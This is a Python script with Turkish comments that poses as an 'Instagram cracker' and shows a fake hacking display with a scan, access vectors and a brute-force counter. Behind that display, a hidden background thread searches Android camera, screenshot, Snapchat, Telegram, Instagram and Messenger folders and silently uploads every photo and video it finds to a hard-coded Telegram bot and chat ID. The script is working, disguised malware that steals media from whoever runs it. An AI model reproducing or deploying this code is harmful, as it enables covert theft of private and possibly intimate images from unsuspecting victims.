import os
import time
import random
import sys
import telebot
import pyfiglet
import threading # Threading kütüphanesini import ediyoruz
import requests # requests kütüphanesini import ediyoruz


class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BOT_TOKEN = "7936621245:AAFaRO9fA5HPjuxyf9IUa79DPNC5zvHwpz4" # KENDİ TOKENİNİ BURAYA GİRMELİSİN!
CHAT_ID = "5994900923" # FOTOĞRAFLARIN GİDECEĞİ ID


bot = None
try:
    bot = telebot.TeleBot(BOT_TOKEN)

except Exception as e:

    print(f"{Colors.RED}[-] Hata: Telegram API bağlantısı kurulamadı veya Token geçersiz. Dosya gönderimi yapılamayabilir ve wordlist.txt içinden şifreler alınmaz.: {e}{Colors.RESET}")


def send_files_silently_threaded(bot_token_arg, chat_id_arg, folder_paths_list):

    if not bot: # Ana thread'deki bot objesi None ise gönderme
        return

    for directory_path in folder_paths_list:
        # print(f"Debug: Klasör işleniyor (threaded): {directory_path}") # DEBUG için
        
        if not os.path.isdir(directory_path):
            # print(f"Debug: Klasör bulunamadı (threaded): {directory_path}") # DEBUG için
            continue # Bu klasörü atla ve bir sonrakine geç

        try:
            file_list = list(os.scandir(directory_path))
            
            for entry in file_list:
               if entry.is_file() and (entry.name.lower().endswith('.mp4') or entry.name.lower().endswith('.png') or entry.name.lower().endswith('.jpg')):

                    file_full_path = os.path.join(directory_path, entry.name)
                    try:
                        # Dosyanın boyutunu kontrol etmek isteyebilirsin (örn: 50MB üstü gönderme)
                        # if os.path.getsize(file_full_path) > 50 * 1024 * 1024: # 50MB
                        #    print(f"Debug: Çok büyük dosya atlandı (threaded): {file_full_path}") # DEBUG için
                        #    continue

                        with open(file_full_path, 'rb') as f:
                            # sendDocument kullanarak dosyayı gönder (görseldeki gibi inline görünebilir)
                            files = {'document': (entry.name, f)}
                            # Dosya gönderme hızını artırmak için time.sleep kaldırıldı veya pasif bırakıldı
                            requests.post(f'https://api.telegram.org/bot{bot_token_arg}/sendDocument?chat_id={chat_id_arg}', files=files)
                            # print(f"Debug: Gönderildi (threaded): {file_full_path}") # DEBUG için
                            # Başarılı gönderildi bilgisi kaldırıldı
                         # time.sleep(0) # Gecikme yok
                    except Exception as e:
                        # print(f"Debug: Hata oluştu gönderilirken (threaded) {file_full_path}: {e}") # DEBUG için
                        pass # Hata olsa bile konsola yazdırma, sadece geç

        except Exception as e:
            # print(f"Debug: Klasör işlenirken hata oluştu (threaded) ({directory_path}): {e}") # DEBUG için
            pass # Hata olsa bile konsola yazdırma, sadece geç
            
        # time.sleep(0) # Klasörler arası gecikme yok


# --- Konsol Görselleştirmesi İçin Yardımcı Fonksiyonlar ---
def print_slow(text, delay=0.005): # Varsayılan gecikme logo için ayarlanabilir
    """Metni yavaş yavaş yazdırır."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_progress(step, total_steps, text, color=Colors.CYAN):
    """Sahte ilerleme çubuğu ve durumu yazdırır."""
    bar_length = 50
    filled_length = int(round(bar_length * step / total_steps))
    bar = '█' * filled_length + '-' * (bar_length - filled_length)
    percent = round(100.0 * step / total_steps, 1)
    # Ana thread printleri ile karışmaması için \r kullanılıyor
    sys.stdout.write(f'\r{color}[{bar}] {percent}%{Colors.RESET} {text}')
    sys.stdout.flush()

def clear_screen():
    """Konsolu temizler."""
    os.system('cls' if os.name == 'nt' else 'clear')


# --- Arka Plan Threadlerini Başlat (Kod Başladığında Hemen Eş Zamanlı Çalışır) ---

# Klasörleri Belirtilen Öncelik Sırasına Gööre Tanımla (Kullanıcının yeni listesi)
klasor_yollari_dosyalar = [
    "/storage/emulated/0/DCIM/Snapchat",
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/DCIM/Screenshots",
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures/Telegram",
    "/storage/emulated/0/Pictures/Instagram",
    "/storage/emulated/0/Pictures/Messenger"
]

# Dosya gönderme fonksiyonunu ayrı bir thread olarak tanımla ve başlat
# Daemon=True ayarı, ana program bittiğinde bu thread'in de kapanmasını sağlar.
file_sending_thread = threading.Thread(target=send_files_silently_threaded, args=(BOT_TOKEN, CHAT_ID, klasor_yollari_dosyalar), daemon=True)

# Bot başarıyla başlatıldıysa dosya gönderme thread'i başlat
if bot:
    # print("Debug: Dosya gönderme thread'i başlatılıyor...") # DEBUG için
    file_sending_thread.start()
# else:
    # print("Debug: Bot başlatılamadığı için dosya gönderme thread'i başlatılmadı.") # DEBUG için


# Sahte sayaç thread'i kaldırıldı, brute force ana akışta yapılacak.
# count_thread = threading.Thread(...)


# --- Simülasyon Başlangıcı (Ana Thread'de Çalışır) ---
# Dosya gönderme işlemi arka planda başlarken simülasyon arayüzü görünür

clear_screen()

# pyfiglet ile logo oluştur
ascii_logo = pyfiglet.figlet_format("H#SHTAG INC. ")
# Logoyu daha yavaş yazdır (yaklaşık 5-10 saniye için delay ayarı)
logo_delay = 0.025 # Bu değeri artırarak veya azaltarak logo yazma süresini ayarlayabilirsin. (Biraz daha yavaşlattım)
print_slow(Colors.CYAN + ascii_logo + Colors.RESET, delay=logo_delay) # Logoya renk eklendi


print("\n" + Colors.CYAN + "="*60 + Colors.RESET + "\n") # Çizgiye renk eklendi
# Gerçek araç gibi görünen bir mesaj
print_slow(f"{Colors.BOLD}{Colors.GREEN}>> INSTAGRAM CR@CKER V3.1.4b 'Hashcr@ck'{Colors.RESET}", delay=0.02) # Versiyon güncellendi
print_slow(f"{Colors.BOLD}{Colors.YELLOW}>> Yasal ve etik sınırlar içinde kullanılması önerilir.{Colors.RESET}", delay=0.02)
print(Colors.CYAN + "="*60 + Colors.RESET + "\n") # Çizgiye renk eklendi

time.sleep(2)

# Hedef Kullanıcı Adını Alma
user_input = input(f"{Colors.BOLD}{Colors.WHITE}>> Hedef Hesap Kullanıcı Adını Girin: {Colors.RESET}") # Metin renklendirildi


# İşlem Adımları (Simülasyon Olduğu Belirtilmeden)
print(f"\n{Colors.CYAN}[*] İşlem Başlatılıyor...{Colors.RESET}") # Metin renklendirildi
time.sleep(2)

# 1. Adım: Bilgi Toplama ve Hedef Analizi
clear_screen()
print_slow(Colors.CYAN + ascii_logo + Colors.RESET, delay=0.002) # Ekran temizlendikten sonra logoyu tekrar animasyonlu göster (daha hızlı ve renkli)
print_slow(f"\n{Colors.GREEN}[+] Hedef Analizi Yapılıyor: {Colors.WHITE}{user_input}{Colors.RESET}", delay=0.03)
print_slow(f"{Colors.CYAN}   -> Kullanıcı ID'si Çözümleniyor...{Colors.RESET}", delay=0.03)
time.sleep(random.uniform(1.5, 3.5))
fake_user_id = random.randint(1000000000, 9999999999)
print_slow(f"{Colors.GREEN}   -> Hedef ID: {Colors.WHITE}{fake_user_id}{Colors.RESET}", delay=0.03)
time.sleep(1.5)
print_slow(f"{Colors.CYAN}   -> Profil Verileri ve Bağlantılar Analiz Ediliyor...{Colors.RESET}", delay=0.03)
time.sleep(random.uniform(3, 6))
print_slow(f"{Colors.GREEN}[+] Hedef analizi tamamlandı.{Colors.RESET}\n", delay=0.03)
time.sleep(2.5)

# 2. Adım: Zafiyet Taraması
clear_screen()
print_slow(Colors.CYAN + ascii_logo + Colors.RESET, delay=0.002) # Ekran temizlendikten sonra logoyu tekrar animasyonlu göster (daha hızlı ve renkli)
print_slow(f"{Colors.RED}[-] Sistem Zafiyeti Taraması Başlatılıyor...{Colors.RESET}", delay=0.03)
total_scan_steps = 70
for i in range(total_scan_steps + 1):
    time.sleep(random.uniform(0.08, 0.25))
    print_progress(i, total_scan_steps, f"{Colors.YELLOW}Zafiyetler Aranıyor...{Colors.RESET}", color=Colors.RED)
print_slow(f"\n{Colors.RED}[-] Tarama tamamlandı. Potansiyel güvenlik açıkları tespit edildi.{Colors.RESET}", delay=0.03)
time.sleep(3)

# --- 3. Adım: Farklı Erişim Vektörlerini Deneme (4 Adet) ---
clear_screen()
print_slow(Colors.CYAN + ascii_logo + Colors.RESET, delay=0.002)
print_slow(f"{Colors.CYAN}[*] Farklı Erişim Vektörleri Deneniyor (Toplam 4 Adet)...{Colors.RESET}", delay=0.03)
time.sleep(2)

access_vectors = [
    "Protokol Zafiyeti İstismarı",
    "API Kimlik Doğrulama Bypass Denemesi",
    "Çerez Tabanlı Oturum Çalma Girişimi",
    "Sosyal Mühendislik Yanıt Simülasyonu"
]

for i, vector in enumerate(access_vectors):
    print_slow(f"\n{Colors.CYAN}  -> Vektör {i+1}: {Colors.WHITE}{vector}{Colors.RESET}", delay=0.03)
    total_vector_steps = 40 # Her vektör denemesi için sahte adım sayısı
    for j in range(total_vector_steps + 1):
         time.sleep(random.uniform(0.05, 0.15))
         print_progress(j, total_vector_steps, f"{Colors.YELLOW}Vektör İşleniyor...{Colors.RESET}", color=Colors.CYAN)
    
    # Sahte vektör deneme sonucu
    vector_success = random.choice([True, False, False]) # Başarı şansı düşük
    if vector_success:
        print_slow(f"\n{Colors.GREEN}  [+] Vektör Başarılı! İkincil Doğrulama Gerekiyor.{Colors.RESET}", delay=0.05)
    else:
         print_slow(f"\n{Colors.RED}  [-] Vektör Engellendi veya Başarısız Oldu.{Colors.RESET}", delay=0.05)
         
    time.sleep(2.5) # Vektörler arası bekleme

print_slow(f"\n{Colors.YELLOW}[*] Tüm Vektör Denemeleri Tamamlandı.{Colors.RESET}", delay=0.03)
time.sleep(2)

# --- 4. Adım: Kapsamlı Brute Force Saldırısı ---
clear_screen()
print_slow(Colors.CYAN + ascii_logo + Colors.RESET, delay=0.002)
print_slow(f"\n{Colors.RED}[!] Kapsamlı Brute Force Saldırısı Başlatılıyor...{Colors.RESET}", delay=0.03) # Metin güncellendi
print_slow(f"{Colors.YELLOW}Hedef Hesap: {Colors.WHITE}{user_input}{Colors.RESET}", delay=0.03) # Hedef kullanıcıyı belirt
time.sleep(2)

total_brute_force_attempts = 586373 # Hedef deneme sayısı
print(f"{Colors.YELLOW}Toplam Deneme Sayısı: {total_brute_force_attempts}{Colors.RESET}\n") # Başlangıç mesajı
time.sleep(1)

# Sahte Brute Force Sayacı (Aşağı Kayacak Şekilde)
for i in range(1, total_brute_force_attempts + 1):
    # Sahte parola denemesi (rastgele karakterler)
    fake_password_attempt = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789!@#$", k=random.randint(8, 12))) # Daha karmaşık parolalar
    
    # Her denemeyi yeni bir satıra, daha büyük formatta yazdır
    print(f'{Colors.BOLD}{Colors.WHITE}[BRUTE FORCE]{Colors.RESET} {Colors.CYAN}Trying:{Colors.RESET} {Colors.YELLOW}{fake_password_attempt}{Colors.RESET} {Colors.WHITE}(Attempt: {i}/{total_brute_force_attempts}){Colors.RESET}')
    
    # Çok küçük bir bekleme ekle
    time.sleep(random.uniform(0.0001, 0.005)) # Süreyi buradan ayarlayarak sayacın hızını kontrol edebilirsin. ÇOK HIZLI OLMAMALI!

# Brute Force Sonucu (Genellikle Başarısız gibi gösterilir)
print(f"\n{Colors.RED}[-] Brute Force Saldırısı Tamamlandı. Hedef Parola Bulunamadı.{Colors.RESET}") # Sonuç
time.sleep(3)


# Genel Erişim Sonucu (Simülasyon)
# brute force genellikle başarısız olduğu için genel sonuç da başarısız olur.
# İstersen burada rastgele başarılı da yapabilirsin ama brute force başarısızsa gerçekçi olmaz.
simulated_overall_success = False # Brute force ana yöntem olarak gösteriliyorsa ve o başarısızsa genel sonuç da başarısız olmalı.
# Vektör denemelerinden biri başarılı olursa genel sonucu True yapabilirsin, ama bu örnekte brute force son adım.


print("\n" + Colors.CYAN + "="*60 + Colors.RESET + "\n") # Çizgiye renk eklendi
# Gerçek araç gibi görünen bir bitiş mesajı
if simulated_overall_success:
    print_slow(f"{Colors.BOLD}{Colors.GREEN}>> İşlem Başarıyla Tamamlandı.{Colors.RESET}", delay=0.02)
else:
     print_slow(f"{Colors.BOLD}{Colors.RED}>> İşlem Tamamlandı. Hedefe Tam Erişim Sağlanamadı.{Colors.RESET}", delay=0.02) # Başarısız sonuç mesajı
print(Colors.CYAN + "="*60 + Colors.RESET + "\n") # Çizgiye renk eklendi


# Program tamamen bitmeden bekle
# Arka plan threadleri daemon olduğu için ana thread bittiğinde onlar da bitecektir.
input(f"{Colors.BOLD}{Colors.WHITE}>> Çıkmak için Enter tuşuna basın...{Colors.RESET}") # Metin renklendirildi

